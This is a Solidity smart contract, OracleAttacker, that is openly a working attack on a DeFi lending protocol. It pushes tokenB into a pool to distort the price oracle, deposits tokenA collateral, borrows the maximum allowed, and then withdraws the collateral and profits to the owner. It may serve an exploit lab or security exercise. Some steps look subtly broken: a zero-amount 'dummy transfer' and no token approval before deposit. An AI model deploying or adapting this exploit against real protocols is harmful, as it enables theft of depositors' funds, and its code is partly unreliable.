// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface ILendingProtocol {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
    function availableToBorrow(address user) external view returns (uint256);
    function withdrawCollateral(uint256 amount) external;
    function collateral(address user) external view returns (uint256);
}

contract OracleAttacker {
    IERC20 public immutable tokenA;
    IERC20 public immutable tokenB;
    ILendingProtocol public immutable lending;
    address public immutable pool;
    address public immutable owner;

    constructor(
        address _tokenA,
        address _tokenB,
        address _pool,
        address _lending
    ) {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
        pool = _pool;
        lending = ILendingProtocol(_lending);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// @notice Execute the oracle manipulation + over-borrow attack.
    /// @param amountBToPool  Amount of tokenB to push into the pool to distort price
    /// @param collateralA    Amount of tokenA to use as collateral in LendingProtocol
    function attack(uint256 amountBToPool, uint256 collateralA) external onlyOwner {
        require(amountBToPool > 0, "no B to manipulate");
        require(collateralA > 0, "no collateral");

        require(
            tokenB.transferFrom(owner, address(this), amountBToPool),
            "fund B failed"
        );
        require(
            tokenB.transfer(pool, amountBToPool),
            "manipulate pool failed"
        );

        require(
            tokenA.transferFrom(owner, address(this), collateralA),
            "fund A failed"
        );

        require(
            tokenA.transfer(address(lending), 0),
            "dummy transfer to ensure interface"
        );
        
        lending.depositCollateral(collateralA);

        uint256 borrowable = lending.availableToBorrow(address(this));
        require(borrowable > 0, "nothing to borrow");

        lending.borrow(borrowable);
    }

    /// @notice Withdraw this contract's collateral from the LendingProtocol (naive implementation).
    function rugCollateral() external onlyOwner {
        uint256 coll = lending.collateral(address(this));
        if (coll > 0) {
            lending.withdrawCollateral(coll);
        }
    }

    /// @notice Send all tokenA and tokenB from this contract back to the EOA owner.
    function withdrawProfit() external onlyOwner {
        uint256 balA = tokenA.balanceOf(address(this));
        uint256 balB = tokenB.balanceOf(address(this));

        if (balA > 0) {
            require(tokenA.transfer(owner, balA), "send A failed");
        }
        if (balB > 0) {
            require(tokenB.transfer(owner, balB), "send B failed");
        }
    }
}